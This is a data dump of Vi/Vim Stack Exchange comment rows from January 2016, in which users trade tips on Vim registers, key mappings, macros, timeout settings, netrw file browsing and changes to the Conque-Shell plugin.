  <row Id="9622" PostId="6193" Score="1" Text="Again, this does not work with original vi" CreationDate="2016-01-21T08:24:38.133" UserId="71" />
  <row Id="9623" PostId="6193" Score="1" Text="@ChristianBrabandt, how have you determined that?  POSIX specs for `vi` include registers.  (They're called &quot;buffers&quot; which can be confusing since there are also &quot;editing buffers&quot;, but they're *there*.)  What part of my answer specifically doesn't work in what version of `vi`?" CreationDate="2016-01-21T08:38:41.500" UserId="4676" />
  <row Id="9624" PostId="6193" Score="1" Text="&lt;c-r&gt;0 is a vim extension. black-hole register is a vim extensions. I am not sure about register 0" CreationDate="2016-01-21T08:39:51.493" UserId="71" />
  <row Id="9625" PostId="6020" Score="0" Text="@joeytwiddle In xfce4-terminal as well as guake, `cat` shows me `^[d`. Vim shows me the same. But I think you're completely right, I should use Vim instead of `cat` to get a reliable information, depending on the terminal emulator and the Vim version there could be some discrepancies. Thanks for the advice !" CreationDate="2016-01-21T10:26:47.940" UserId="4939" />
  <row Id="9626" PostId="6187" Score="1" Text="@k0pernikus I'm afraid we'll have to agree to disagree on that one. To me, the important part of both questions is the replacement, and not the text object used to apply it." CreationDate="2016-01-21T11:17:43.127" UserId="343" />
  <row Id="9628" PostId="6204" Score="0" Text="Thank you romainl. There is quite a lot that I learned from this post." CreationDate="2016-01-21T13:57:39.620" UserId="989" />
  <row Id="9630" PostId="6172" Score="0" Text="In addition to @PhilippFrank 's comment, you can append to the end of every line by selecting the region and calling `:right`, followed by blockwise selection and `A&quot;&gt;`. The answer is much nicer though" CreationDate="2016-01-21T16:05:55.713" UserId="4655" />
  <row Id="9631" PostId="6206" Score="2" Text="But then how would you type &quot;serfdom&quot;?! More seriously, I don't know of a better way than simply mapping all the combos (not sure what you ask for is even possible in Vim), but I'd note that you could *create* the mappings with a little Vimscript loop, rather than having add them all individually to your `vimrc`; I'll add an answer that does this if no-one comes up with a proper solution." CreationDate="2016-01-21T17:24:41.913" UserId="343" />
  <row Id="9632" PostId="6206" Score="0" Text="I guess you could also map `fd` to a function that takes input and converts it if appropriate. Marginally cleaner. I'll write this, too." CreationDate="2016-01-21T17:34:14.170" UserId="343" />
  <row Id="9633" PostId="5954" Score="0" Text="I have set mouse=a in there and I've tried every single value for ttymouse but none seems to work. Whenever I click on something the cursor stops blinking as if vim is trying hard to do something but then nothing happens when I click on another window or try to resize one or even go to a line through clicking. It's almost like vim is not responding at the moment I click and then takes a while until it goes back to normal." CreationDate="2016-01-21T19:31:00.927" UserId="5780" />
  <row Id="9634" PostId="6192" Score="0" Text="I didn't actually notice the question was posted almost year ago, the answer describes the current situation (Jan 2016)" CreationDate="2016-01-21T19:44:18.263" UserId="6013" />
  <row Id="9635" PostId="5358" Score="0" Text="Upvote for you, as you save me some keystrokes" CreationDate="2016-01-21T21:16:40.753" UserId="6110" />
  <row Id="9636" PostId="6210" Score="2" Text="Of course, you could also create a mapping for this:  `nnoremap {key} 0y$/\V&lt;c-r&gt;&quot;&lt;cr&gt;`" CreationDate="2016-01-21T23:50:21.820" UserId="865" />
  <row Id="9639" PostId="6206" Score="3" Text="&gt; Is there a way to map the shift function to a dominant finger?&#xA;&#xA;Depending on your keyboard, yes. [tmk keyboard firmware](https://github.com/tmk/tmk_keyboard) can remap different keys into different layers, or even remap key sequences into different macros. Personally, I've got my 'f' to cause the right half of my keyboard to turn into a numpad when held down, for example.&#xA;&#xA;If you care a lot about your hands/fingers, or are currently suffering from RSI, check it out!" CreationDate="2016-01-22T01:12:33.087" UserId="4932" />
  <row Id="9641" PostId="6206" Score="1" Text="You may be interested in enabling [&quot;sticky keys&quot;](https://en.wikipedia.org/wiki/Sticky_keys) in your OS.  I think doing that would mostly resolve your situation, plus perhaps remapping your shift key to another more convenient key at an abstraction level above (below?) Vim itself...." CreationDate="2016-01-22T02:45:20.107" UserId="4676" />
  <row Id="9645" PostId="6206" Score="0" Text="And here I was thinking that mentioning Hasu's TMK would be too 'hardcore' stuff :D In any case, your problem should be solved much better at OS or even keyboard firmware level (if possible)." CreationDate="2016-01-22T10:15:40.620" UserId="1800" />
  <row Id="9646" PostId="6214" Score="1" Text="You could use a strategy: split lines first, use that solution, than join all lines." CreationDate="2016-01-22T10:21:35.940" UserId="1800" />
  <row Id="9648" PostId="5974" Score="2" Text="Use `:set nocomptible` in vim. Also please check the values: `:verbose set cp? cpo?`" CreationDate="2016-01-22T12:44:07.723" UserId="71" />
  <row Id="9651" PostId="6219" Score="1" Text="Doesn't `*` only search for the word under the cursor, and not the current visual selection?" CreationDate="2016-01-22T14:06:31.533" UserId="865" />
  <row Id="9659" PostId="6209" Score="0" Text="I added the mappings but actually it's jumping to the first matching word and NOT selecting the entire line." CreationDate="2016-01-22T15:04:03.213" UserId="2706" />
  <row Id="9660" PostId="6209" Score="0" Text="If it is match a word then I assume you are using `*` from normal mode or do not have the mapping installed correctly." CreationDate="2016-01-22T15:15:01.840" UserId="778" />
  <row Id="9661" PostId="6219" Score="1" Text="@EvergreenTree I did forget to mention the plugin. Thanks for notice" CreationDate="2016-01-22T16:17:58.173" UserId="177" />
  <row Id="9662" PostId="6206" Score="0" Text="Thanks for the TMK suggestion, sounds like a great solution at the OS level. I will be sure to give it a try." CreationDate="2016-01-22T20:26:36.037" UserId="2882" />
  <row Id="9663" PostId="6212" Score="0" Text="This is great! I can add the values for other keys, but I couldn't have done this. Thanks for the 'proof of concept'." CreationDate="2016-01-22T20:29:55.233" UserId="2882" />
  <row Id="9664" PostId="6206" Score="0" Text="YW. TMK works at firmware level, though. Example for HHKB: http://nathankot.com/blog/2013/09/05/modding-the-happy-hacking-keyboard/ - but, you can use a USB-USB converter (also made by Hasu) with any keyboard, and that converter can be made pretty cheaply." CreationDate="2016-01-22T22:01:58.537" UserId="1800" />
  <row Id="9665" PostId="6221" Score="3" Text="You can also use `q/` to get the same effect as `/&lt;c-f&gt;`" CreationDate="2016-01-23T00:59:59.417" UserId="514" />
  <row Id="9666" PostId="6224" Score="3" Text="Re-map the &quot;open-file&quot; combination in NerdTree to something more difficult to hit by mistake. Or ditch NerdTree entirely :P" CreationDate="2016-01-23T13:02:08.290" UserId="1800" />
  <row Id="9667" PostId="6226" Score="1" Text="Thank you for you answer. Looks like the best solutions would be to improve ruby plugin. Someone already lodged an issue https://github.com/vim-ruby/vim-ruby/issues/268" CreationDate="2016-01-23T17:28:16.017" UserId="6121" />
  <row Id="9668" PostId="6228" Score="2" Text="Not sure this is exactly what you want, but if you give the right value to the option `'keywordprg'` (the name of a program which can handle the documentation for the language you want), then by hitting `K` on a keyword (which can be the name of a function), you should get the info you want. For example, if you install `cppman` (https://github.com/aitjcize/cppman) and add an autocmd inside your vimrc such as `autocmd FileType cpp setlocal keywordprg=cppman`, then `cppman` should handle the documentation inside a c++ buffer. Not tested though." CreationDate="2016-01-23T18:33:24.970" UserId="4939" />
  <row Id="9671" PostId="6229" Score="1" Text="`[i` is weird. It works for `stdlib.h` and `qsort`, but not `cstdlib` and `std::qsort` or just `qsort`." CreationDate="2016-01-23T20:25:45.130" UserId="205" />
  <row Id="9673" PostId="6231" Score="2" Text="Does the following change anything?: `:set timeout timeoutlen=3000 ttimeoutlen=100`. If so this question might be related: https://vi.stackexchange.com/questions/3261/speed-bump-on-esco-insert-to-normal-to-insert-new-line-above-cursor It's also a setting which is suggested in `:help ttimeoutlen`." CreationDate="2016-01-23T21:23:39.973" UserId="4939" />
  <row Id="9675" PostId="2358" Score="0" Text="@KarlYngveLervåg I switched to vimtex recently. Did you get around to adding this feature? Then I can nuke the dictionary, and perhaps you can post using vimtex as an answer." CreationDate="2016-01-23T23:46:48.560" UserId="205" />
  <row Id="9676" PostId="6228" Score="2" Text="@saginaw While `cppman` is an excellent suggestion, if you have the C and C++ manpages (`manpages-posix-dev` and `libstdc++-X.Y-doc` packages on Debian-based systems) installed, plain old `man` should work." CreationDate="2016-01-23T23:53:28.357" UserId="205" />
  <row Id="9677" PostId="2206" Score="0" Text="After using this for nearly a year, I have some suggestions: wrap it in `if expand('%') !~ '^[.~]\?/'` ... `endif` so that explicilty specified relative or absolute paths get skipped; and use `silent` instead of `silent!`, because if you open `vim vimrc` in two terminals, the second will wait for input to the usual &quot;file is open elsewhere&quot; warning, but the user has no idea what it's waiting for. I'm not editing it yet, to see if you have better ways to tackle either." CreationDate="2016-01-24T01:51:44.407" UserId="205" />
  <row Id="9678" PostId="6198" Score="1" Text="If non-core solutions are acceptable then there is https://github.com/tommcdo/vim-exchange which let's you not only exchange words but also whole regions http://vimcasts.org/episodes/swapping-two-regions-of-text-with-exchange-vim/" CreationDate="2016-01-24T05:07:26.017" UserId="428" />
  <row Id="9679" PostId="6224" Score="0" Text="Would you be so kind to explain to me what do you mean by &quot;ditch NerdTree entirely&quot; ?" CreationDate="2016-01-24T08:56:32.553" UserId="2993" />
  <row Id="9680" PostId="6232" Score="1" Text="That's the manpage of [`printf(1)`](http://manpages.debian.org/cgi-bin/man.cgi?&amp;query=printf) the command, not [`printf(3)`](http://manpages.debian.org/cgi-bin/man.cgi?query=printf&amp;sektion=3) the function. In any case, the C function manpages are from [`manpages-dev`](https://packages.debian.org/jessie/all/manpages-dev/filelist), which is usually installed by default, but not always, and POSIX functions are in [`manpages-posix-dev`](https://packages.debian.org/jessie/all/manpages-posix-dev/filelist) - usually not installed by default, neither is C++ documentation (`libstdc++-X.Y-doc`)." CreationDate="2016-01-24T09:24:27.737" UserId="205" />
  <row Id="9681" PostId="6233" Score="0" Text="You could visually select your lines and type `:'&lt;,'&gt;norm @q`. The macro `q` should be applied once per line. You won't have to insert the visual range `'&lt;,'&gt;`, Vim will do it automatically for you. So, you will only have to type `:norm @q`." CreationDate="2016-01-24T10:05:12.100" UserId="4939" />
  <row Id="9682" PostId="6234" Score="0" Text="If I do that, it inserts `grid%` before the tab so I end up with `grid%&lt;tab&gt;u(0:`..." CreationDate="2016-01-24T10:18:25.253" UserId="4562" />
  <row Id="9683" PostId="6234" Score="1" Text="@solalito When your begin the recording of your macro, hit `_` or `^` to make sure that each time the macro will be replayed it will begin on the first non whitespace of the line." CreationDate="2016-01-24T10:53:09.540" UserId="4939" />
  <row Id="9684" PostId="6234" Score="1" Text="That's because you use `i` instead of `I`: `qqIgrid%…`" CreationDate="2016-01-24T10:53:28.320" UserId="54" />
  <row Id="9685" PostId="2358" Score="0" Text="Yes. I recommend that you use `snippets` for complicated expansions, but for simple ones, you can look at `:h vimtex-imaps` fo a description of the feature implemented in vimtex." CreationDate="2016-01-24T11:15:56.280" UserId="21" />
  <row Id="9686" PostId="6235" Score="0" Text="If you double escape the newline (`\\n` instead of `\n`), does it change anything? I had a similar problem, and I remember solving it by putting one or more backslashes in front of the newline character. If a double escape fails, maybe try with 3 or 4 escapes." CreationDate="2016-01-24T11:43:14.827" UserId="4939" />
  <row Id="9687" PostId="6235" Score="0" Text="I actually tried that, but it just escapes the first backslash, returning a literal &quot;\n&quot; string." CreationDate="2016-01-24T15:03:23.773" UserId="2593" />
  <row Id="9688" PostId="6238" Score="0" Text="(Sorry if the tags are way off—feel free to edit.)" CreationDate="2016-01-24T17:04:29.910" UserId="142" />
  <row Id="9689" PostId="6237" Score="7" Text="Have you tried `:set autoindent`?" CreationDate="2016-01-24T17:14:39.420" UserId="4939" />
  <row Id="9690" PostId="6224" Score="1" Text="I.e. don't use it until you get more familiar with Vim configuration, and then reading Vim plugins help files. I do assume (perhaps I'm wrong) that you are not too used to Vim, due to the non-specific way in which you have asked your question (appearance, using Vim as an IDE, or coming from one)." CreationDate="2016-01-24T17:40:00.833" UserId="1800" />
  <row Id="9691" PostId="6236" Score="0" Text="You know, I was going to mention that I'd tried this, too. Unfortunately, I just get another control character (`^M`)." CreationDate="2016-01-24T18:25:13.280" UserId="2593" />
  <row Id="9692" PostId="6236" Score="0" Text="@RyanLue and `^M` is the carriage return. Odd. I'll have to experiment a bit." CreationDate="2016-01-24T18:27:00.587" UserId="205" />
  <row Id="9693" PostId="6240" Score="1" Text="Would that `clang_completer` be https://github.com/Rip-Rip/clang_complete, or another plugin?" CreationDate="2016-01-24T19:38:33.443" UserId="205" />
  <row Id="9694" PostId="6239" Score="2" Text="You could be more specific - which language? Perhaps check if your language does not define another syntax rule for `**`, which disables the comment; or maybe `**` simply means &quot;start comment - end comment&quot; and creates an empty comment in that language." CreationDate="2016-01-25T01:27:20.757" UserId="1800" />
  <row Id="9695" PostId="6238" Score="1" Text="What happens if you clear the screen in vimscript, right at the end of the statusline update (after the `system` call)? Also, do you have a recent Vim version - newer versions may have that graphical glitch solved. Also, ideally you would never run lengthy operations to update the statusline; some other operation should update a variable, which the statusline should read when it needs to update itself." CreationDate="2016-01-25T01:29:21.563" UserId="1800" />
  <row Id="9696" PostId="6238" Score="1" Text="I don't have this problem in xterm with Vim 7.4.712. Which Vim version and terminal emulator are you using?" CreationDate="2016-01-25T02:11:50.597" UserId="51" />
  <row Id="9697" PostId="6238" Score="1" Text="I also do not have this problem (Vim 7.4.1089) (neither in vim in urxvt or gvim)." CreationDate="2016-01-25T09:11:31.407" UserId="21" />
  <row Id="9698" PostId="6054" Score="0" Text="You *can* use several `-c` commands in *some* implementations (not required by [POSIX specifications for `ex`](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/ex.html)), but I believe in all such implementations you must use `-s` to set `ex` to &quot;silent mode, in preparation for batch processing.&quot;" CreationDate="2016-01-25T09:29:09.897" UserId="4676" />
  <row Id="9699" PostId="4275" Score="0" Text="What is the behavior of `ex` if the searched-for regex `/dd/` doesn't exist in the file?" CreationDate="2016-01-25T09:59:07.613" UserId="4676" />
  <row Id="9700" PostId="6247" Score="0" Text="But what if the platform you are using Vim on is *not* POSIX (and therefore doesn't have `ex`)? ;-)  (Just pulling your leg, good answer.)" CreationDate="2016-01-25T10:35:30.450" UserId="1726" />
  <row Id="9701" PostId="6242" Score="1" Text="It can also be that your terminal catches F7 before it reaches Vim." CreationDate="2016-01-25T11:29:50.740" UserId="1800" />
  <row Id="9702" PostId="6238" Score="0" Text="@Carpetsmoker I'm using Vim 7.4 with patches 1–52 (2013 Aug 10 build; standard from Mint 17/Ubuntu 14.04 LTS repo), and can reproduce on GNOME Terminal 3.6.2 and XTerm(297)." CreationDate="2016-01-25T13:09:02.460" UserId="142" />
  <row Id="9703" PostId="6238" Score="0" Text="@KarlYngveLervåg The problem does not occur for me in gvim (same version), but I don't use gvim." CreationDate="2016-01-25T13:10:08.660" UserId="142" />
  <row Id="9704" PostId="6238" Score="0" Text="@VanLaser A `redraw!` works but causes equally distracting flicker that means I can't actually see the statusline while navigating (rather defeating the purpose). A `redraw` doesn't seem to do much." CreationDate="2016-01-25T13:10:55.553" UserId="142" />
  <row Id="9705" PostId="6238" Score="0" Text="@VanLaser Thanks for the advice; the reason I put this in the statusline was because I wanted it to update every time the status line needs to be updated—e.g., because the user moved the selection—and just putting the computation in the statusline itslef seemed like the most foolproof way. Should I use something like the `CursorMoved` augroup? Would the  autocmd action then need to call `redrawstatusline` or something?" CreationDate="2016-01-25T13:13:05.410" UserId="142" />
  <row Id="9706" PostId="6239" Score="0" Text="I added some specifics as well as another example. Can you explain how I would go about checking these things in vim? I'm not really sure where to find the settings that determine what vim considers to be a comment." CreationDate="2016-01-25T13:30:12.087" UserId="5464" />
  <row Id="9707" PostId="4111" Score="0" Text="If you're using Vim for keybindings, consider [Spacemacs](https://github.com/syl20bnr/spacemacs)." CreationDate="2016-01-25T14:06:30.297" UserId="5950" />
  <row Id="9708" PostId="6246" Score="1" Text="You should probably move the &quot;edit&quot; to the top of the post. :D" CreationDate="2016-01-25T14:27:39.247" UserId="205" />
  <row Id="9710" PostId="6246" Score="1" Text="Your new edit implies that the *augroup* brings &quot;no advantage&quot;, which is not correct. I'd be tempted just to remove the older version of the autocmd entirely." CreationDate="2016-01-25T15:28:42.717" UserId="343" />
  <row Id="9711" PostId="6238" Score="2" Text="Indeed, and I suggest to use `CursorHold` / `CursorHoldI` events to update the variable, if possible. IIRC this is the method used by tagbar.vim (which also has an vim-airline extension)." CreationDate="2016-01-25T16:00:55.460" UserId="1800" />
  <row Id="9712" PostId="6251" Score="4" Text="If you type `vim +7 file_name` or `vim -c7 file_name`, it will open `file_name` and position the cursor on line 7. If you type `vim +'/pattern' file_name` or `vim -c '/pattern' file_name` it will open `file_name` and position the cursor on the first line where `pattern` is found. From there if you hit `n`, you will reach the other matches. However, I did not understand your second question concerning the tab sequence and Tab key, sorry." CreationDate="2016-01-25T16:44:44.197" UserId="4939" />
  <row Id="9713" PostId="6251" Score="0" Text="@saginaw Hey thanks for the line number tip. I have searching for it so long. And, as for the tab sequence, Imagine its like arguments in a function where you tab over to the next argument but instead in this case you tab over to a different line. I hope that made some sense." CreationDate="2016-01-25T16:56:03.067" UserId="5481" />
  <row Id="9714" PostId="6238" Score="0" Text="@VanLaser Sounds like a good idea—but `CursorHold` only updates every 4000ms (and I don't want to decrease `updatetime` to 100ms because that would induce oodles of swap file writes), while `CursorMove` causes way more lag than just updating directly in the statusline, and also doesn't completely fix the display issue (though it's a bit better). Any suggestions for asynchronous actions or something like that?" CreationDate="2016-01-25T17:04:42.713" UserId="142" />
  <row Id="9715" PostId="6251" Score="1" Text="Do you mean you want to move across a predefined set of lines? Like for example, you know in advance you want to be on line 7, then move to line 12, then 19 ? If so, I may be wrong but it seems you would benefit from scripting your editions. For example, you could write all your editions in a file, let's say `myedits.vim`, where each line is an Ex command, and then from the shell type `vim +'so myedits.vim' file_name`. If it's what you want, you could be interested in this: http://vi.stackexchange.com/a/5990/4939 Otherwise, could you provide more info on your end goal?" CreationDate="2016-01-25T17:05:56.073" UserId="4939" />
  <row Id="9716" PostId="4275" Score="1" Text="@Wildcard the command simply doesn't do anything and the whole file is printed." CreationDate="2016-01-25T17:09:31.690" UserId="865" />
  <row Id="9717" PostId="6251" Score="0" Text="Let's say you know in advance you want to move on line 7, then 12, then 19. In this case, you could type this: `vim +':12ma a | 19ma b | 7' file_name`, it will open your file on line 7. Then to go on line 12 hit `'a`, and to go on line 19 hit `'b`." CreationDate="2016-01-25T17:12:43.840" UserId="4939" />
  <row Id="9718" PostId="6251" Score="0" Text="@saginaw I guess that sort of helps what i want to do. But, what i am trying here is that I have a mark down file with headers, A, B and C. Now, we open that file for the user with the cursor on line below the header A. If he decides to skip that, he should be able to go to the line below B, with just a tab. Similarly from B to C and so on.. But, the line numbers are not constant. As, if the user types something the first time, everything else goes down." CreationDate="2016-01-25T17:14:32.517" UserId="5481" />
  <row Id="9719" PostId="6251" Score="0" Text="If your headers begin with the character `#` you could define the following mapping: `nnoremap &lt;silent&gt; &lt;Tab&gt; /^#/+1&lt;CR&gt;` Hitting `&lt;Tab&gt;` should move your cursor below the next header. You can also make the mapping local to the buffer by adding the argument `&lt;buffer&gt;` if you want `&lt;Tab&gt;` to have different behaviors depending on the filetype." CreationDate="2016-01-25T17:26:05.810" UserId="4939" />
  <row Id="9720" PostId="6238" Score="0" Text="You could probably integrate your work with Shougo's VimProc plugin; but I suggested `CursorHold` precisely because it's triggered only after a &quot;still&quot; period. This allows for smooth movement and a lazy statusbar information update. You could also disable swap files, lower the timeout and rely on some version control software ..." CreationDate="2016-01-25T17:30:50.373" UserId="1800" />
  <row Id="9721" PostId="6251" Score="0" Text="@saginaw That was my first instinct to do. But, this vim will be opened and handled by a shell script. So, setting all the mappings before hand is not exactly possible. But, i guess i can put it in a file and source it before opening vim." CreationDate="2016-01-25T17:30:54.873" UserId="5481" />
  <row Id="9722" PostId="6251" Score="0" Text="Your shell script can source any file (which can contain any Ex command including `:nnoremap`) when it opens a file: `vim +'so mappings.vim' file_name`" CreationDate="2016-01-25T17:48:52.253" UserId="4939" />
  <row Id="9723" PostId="6251" Score="1" Text="You might be able to do this with syntax folding and `]z`? Or by putting the sections into the quickfix list or the location list with `vimgrep` and mapping tab to `:cn` or `:ln`" CreationDate="2016-01-25T18:07:37.687" UserId="4655" />
  <row Id="9724" PostId="6252" Score="0" Text="thanks for the tip, but I use Conque ubiquitously for dev work in _many_ languages (R, matlab, bash, MySQL, _etc_) and am hoping to avoid context switching for the sake of one language." CreationDate="2016-01-25T19:16:29.463" UserId="4686" />
  <row Id="9725" PostId="6252" Score="0" Text="The problem to be solved as I see it is to modify the `maparg ... sil exe` bits (and vimscript is Greek to me) to accept an optional prefix and postfix (which I can define based on filetype) that would contain the gate strings _viz_ `%cpaste` and so on." CreationDate="2016-01-25T19:20:43.407" UserId="4686" />
  <row Id="9726" PostId="6250" Score="0" Text="I ended up using set comments=:# since I prefer that there be no immediate space after the # on the second line. (I neglected to indicate this in my question.) Thanks for the clear explanation!" CreationDate="2016-01-25T19:24:05.370" UserId="5464" />
  <row Id="9727" PostId="4901" Score="0" Text="Not sure I understood your question because I know nothing about python, Conque or IPython. So I'm going to try and reformulate it with my words. You've got a key whose value is stored in the global variable `g:ConqueTerm_SendVisKey`, let's say `&lt;F9&gt;`. When you visually select some text and hit on this key, it's sent to some other process, which is what you want. But sometimes you want to send something slightly different: `%cpaste` + `visually selected text` + `--`. Is it what you want?" CreationDate="2016-01-25T19:38:43.020" UserId="4939" />
  <row Id="9729" PostId="6253" Score="0" Text="Maybe you could play with the value of the 2 options `'timeout'` and `'timeoutlen'`. For example, if you type `:set notimeout` or if you increase the value of `'timeoutlen'` (let's say to 3s `:set timeoutlen=3000`). Does it change anything ?" CreationDate="2016-01-25T19:59:01.243" UserId="4939" />
  <row Id="9732" PostId="4901" Score="0" Text="@saginaw that is it exactly; since I use `&lt;F9&gt;` everywhere, I would prefer to set a text prefix and suffix (empty by default) which are _always_ added to the payload, and then set them by filetype. I admit, however, I don't even know how to do basic string concatenation or interpolation in vimscript." CreationDate="2016-01-25T20:28:48.697" UserId="4686" />
  <row Id="9733" PostId="6253" Score="0" Text="@saginaw I'll try that and see if I can reproduce the problem." CreationDate="2016-01-25T20:31:12.613" UserId="5575" />
  <row Id="9737" PostId="6242" Score="0" Text="As this is more of a terminal configuration question than a Vim question, you're going to have to add some details about your environment: which operating system, which terminal (OS X Terminal.app? PuTTY?), what emulator settings (VT100?) etc." CreationDate="2016-01-25T20:45:46.523" UserId="24" />
  <row Id="9738" PostId="5290" Score="0" Text="What version of Bash? Some versions have [job control bugs](https://bugs.debian.org/331409)." CreationDate="2016-01-25T20:52:05.417" UserId="24" />
  <row Id="9740" PostId="4901" Score="0" Text="Not sure, but you could try this. In your vimrc add this autocmd: `autocmd BufNewFile,BufRead * if &amp;ft ==# 'python' | let [b:gate_start, b:gate_end] = [&quot;%cpaste\n&quot;, &quot;\n--&quot;] | else | let [b:gate_start, b:gate_end] = [&quot;&quot;, &quot;&quot;] | endif`&#xA; It will set the value for the prefix/suffix. Next, in the code of the `send_selected()` function inside your Conque plugin, there must be a line like this: ```sil exe &quot;normal! `&lt;&quot; . a:type . &quot;`&gt;y&quot;``` This line copies your visually selected text which is now inside the unnamed register `@@`." CreationDate="2016-01-25T20:56:31.987" UserId="4939" />
  <row Id="9741" PostId="4901" Score="0" Text="Just after this line, you could try to add the following line, which hopefully will do the concatenation: `let @@ = b:gate_start . @@ . b:gate_end`" CreationDate="2016-01-25T20:57:03.930" UserId="4939" />
  <row Id="9742" PostId="4901" Score="0" Text="Assuming you're using this Conque plugin (https://github.com/vim-scripts/Conque-Shell), here is the line after which you must do the concatenation: https://github.com/vim-scripts/Conque-Shell/blob/master/autoload/conque_term.vim#L1227" CreationDate="2016-01-25T21:24:36.360" UserId="4939" />
  <row Id="9743" PostId="6253" Score="0" Text="Sorry `set notimeout` was a complete bad idea, however slightly increasing the value of `'timeoutlen'` might still be worth a try. You could also look at the options `'ttimeout'` and `'ttimeoutlen'` but normally those only concern key codes not mappings so they shouldn't be useful here." CreationDate="2016-01-25T21:31:06.950" UserId="4939" />
  <row Id="9744" PostId="6252" Score="0" Text="@shabbychef The line you're referring to simply defines a mapping. The mapping tells Vim that whenever you hit on `&lt;F9&gt;` in visual mode, it must call the function `send_selected()`. So you must not modify the mapping but the function which is defined here: https://github.com/vim-scripts/Conque-Shell/blob/master/autoload/conque_term.vim#L1220-L1244 The line 1227 copies your visual selection in the unnamed register `@@`. You can concatenate your variables `gate_start` and `gate_end` just after it." CreationDate="2016-01-25T21:59:25.090" UserId="4939" />
  <row Id="9745" PostId="4901" Score="0" Text="@saginaw I forked the repo and modified it as follows: https://github.com/shabbychef/Conque-Shell/blob/master/autoload/conque_term.vim#L1235-L1238. Any reason I couldn't use a global variable like `g:ConqueTerm_SuffixString`?" CreationDate="2016-01-26T00:04:45.650" UserId="4686" />
  <row Id="9746" PostId="6240" Score="0" Text="Yes, that's this plugin." CreationDate="2016-01-26T04:08:33.030" UserId="5546" />
  <row Id="9747" PostId="6255" Score="5" Text="I am afraid, syntax priorities are hard-wired in the source. And it is messy there. That would mean, you'd have to change Vims source" CreationDate="2016-01-26T07:19:13.937" UserId="71" />
  <row Id="9751" PostId="6254" Score="1" Text="Try the following: hit `mt` on the target directory in which you want to make a copy of a file (to mark it ; the path to the folder should appear in the banner after `Copy/Move Tgt:`), hit `mf` on the file you want to copy to mark it as well, then hit `mc` to actually perform the copy." CreationDate="2016-01-26T07:38:27.090" UserId="4939" />
  <row Id="9754" PostId="4901" Score="0" Text="It depends on how you intend to define your variables (through an autocmd, inside the called function ...). Maybe the simplest way would be to test the filetype of the current buffer inside the function `send_selected()`, set the values of the prefix/suffix accordingly, and finally do the concatenation. Something like this: http://vpaste.net/UN0m3 When you define a variable inside a function, it's local to the latter by default, no need of a scope. Does it work?" CreationDate="2016-01-26T10:42:11.627" UserId="4939" />
  <row Id="9755" PostId="6253" Score="0" Text="It does appear the `timeoutlen` has an impact, if you want to post that as the answer I'll accept it. There's also a more complicated method, that doesn't quite suit my needs but is nonetheless interesting, here: http://vi.stackexchange.com/questions/563/map-a-sequence-of-letters-in-insert-mode?rq=1" CreationDate="2016-01-26T14:22:27.597" UserId="5575" />
  <row Id="9756" PostId="6253" Score="1" Text="Indeed you're right, it was very interesting to read, however I was unable to tweak the code so that it escapes from insert mode, sorry. Apart from an `:echo` command, the other Ex commands I tried resulted in an error `E523`. If my answer does not fully solve your issue, feel free to not accept it and to update your question to get more help." CreationDate="2016-01-26T15:20:45.500" UserId="4939" />
  <row Id="9758" PostId="6258" Score="3" Text="In `:help netrw-explore` they mention several other commands to explore your files. Among them are `:Texplore` which opens the file explorer window in a new tab instead of using your current window. There are other variants you could try, like `:Sexplore` (horizontal split) or `:Vexplore` (vertical split). When your cursor is on a file, you can also hit `o`, `v`, or `t` to open it in a horizontal split, vertical split or tab." CreationDate="2016-01-26T16:08:09.280" UserId="4939" />
  <row Id="9759" PostId="6260" Score="4" Text="Are you running the same .vimrc on both machines? Are both machines running the same version of Vim? Do you have the same plugins on both machines?" CreationDate="2016-01-26T16:59:40.683" UserId="1529" />
  <row Id="9760" PostId="2801" Score="0" Text="In Debian, I cannot reproduce in `vim-runtime` 7.4.826-1 (Sid/unstable and Stretch/testing), but I can in 7.4.488-7 (Jessie/stable). https://tracker.debian.org/pkg/vim" CreationDate="2016-01-26T17:48:00.587" UserId="4498" />
  <row Id="9761" PostId="6260" Score="2" Text="See http://vi.stackexchange.com/a/6145/205 - perhaps it will help you understand what's going on." CreationDate="2016-01-26T18:12:59.580" UserId="205" />
  <row Id="9762" PostId="6260" Score="1" Text="@muru, that does seem relevant—the Mac has a file `awk.vim` in `/usr/share/vim/vim73/indent` and the MobaXterm seems to have no such file (and a lot fewer syntax files in general).  But how can I fix this?  (I've never installed any plugins at all, just using Vim &quot;out of the box&quot;.)" CreationDate="2016-01-26T18:19:56.023" UserId="4676" />
  <row Id="9763" PostId="6260" Score="2" Text="Files in `$VIMRUNTIME` (`/usr/share/vim/vim73` in the Mac) aren't plugins in the usual sense, they come with Vim, depending on compilation flags, I think. I have never used MobaXterm, but it seems to have GVim available (it's listed in http://mobaxterm.mobatek.net/plugins.html) - maybe try that. Or you can just create `~/.vim/indent/awk.vim` containing `setlocal autoindent`." CreationDate="2016-01-26T18:36:07.330" UserId="205" />
  <row Id="9764" PostId="6242" Score="0" Text="The answer below clarified the question. How do I use F7 in vimtex?" CreationDate="2016-01-26T19:33:48.110" UserId="5919" />
  <row Id="9765" PostId="6263" Score="0" Text="How did you enter `^[`? Ctrl-V Esc?" CreationDate="2016-01-26T20:21:59.963" UserId="205" />
  <row Id="9766" PostId="6258" Score="0" Text="@saginaw That's worth an answer." CreationDate="2016-01-26T20:24:23.890" UserId="205" />
  <row Id="9767" PostId="6263" Score="0" Text="I originally go the ^[ from just recording the macro when I hit esc. Then I tried manually inserting it into the macro like `:let @t=&quot;2Ea,^[j^&quot;` where ^[ was Ctrl-V Esc. Both produced the same result when I run the macro, ê^" CreationDate="2016-01-26T20:25:35.610" UserId="2541" />
  <row Id="9768" PostId="6267" Score="0" Text="Ah, thanks. So, I think this is what I was going after: `if s:myVar =~ '\v^S\d+'`" CreationDate="2016-01-26T20:53:01.867" UserId="2312" />
  <row Id="9769" PostId="6267" Score="1" Text="@Jonathan.Brink you can also tack on case insensitivity to the pattern: `'\v\c^S\d+'`." CreationDate="2016-01-26T20:55:11.980" UserId="205" />
  <row Id="9770" PostId="6267" Score="0" Text="nice. Would that be preferable to using `=~?`" CreationDate="2016-01-26T20:56:29.740" UserId="2312" />
  <row Id="9771" PostId="6267" Score="1" Text="@Jonathan.Brink Depends on how you intend to use it. If you intend to re-use the pattern (keep it in a variable, and do tests in multiple places or something), using `\c` will centralise the case-insensitivity. Useful for code organization, otherwise I don't think there's a difference." CreationDate="2016-01-26T20:58:46.890" UserId="205" />
  <row Id="9772" PostId="6267" Score="0" Text="Gotcha, thanks for the tip!" CreationDate="2016-01-26T20:59:12.867" UserId="2312" />
